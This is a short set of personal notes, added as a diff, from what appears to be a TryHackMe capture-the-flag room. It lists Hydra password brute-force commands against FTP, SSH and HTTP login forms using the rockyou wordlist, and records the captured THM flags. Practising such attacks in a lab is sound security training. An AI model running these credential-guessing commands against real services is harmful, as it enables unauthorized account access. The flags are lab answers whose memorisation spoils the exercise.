@@ -1,0 +1,19 @@
+---------
+Notes
+---------
+Basic command format
+
+FTP
+hydra -l user -P passlist.txt ftp://IP
+
+SSH
+hydra -l user -P passlist.txt IP -t 4 ssh
+
+Post web form
+hydra -l username -P wordlist IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.25.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+	THM{2673a7dd116de68e85c48ec0b1f2612e}
+
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.25.100 -t 6 ssh -V
+	THM{c8eeb0468febbadea859baeb33b2541b}
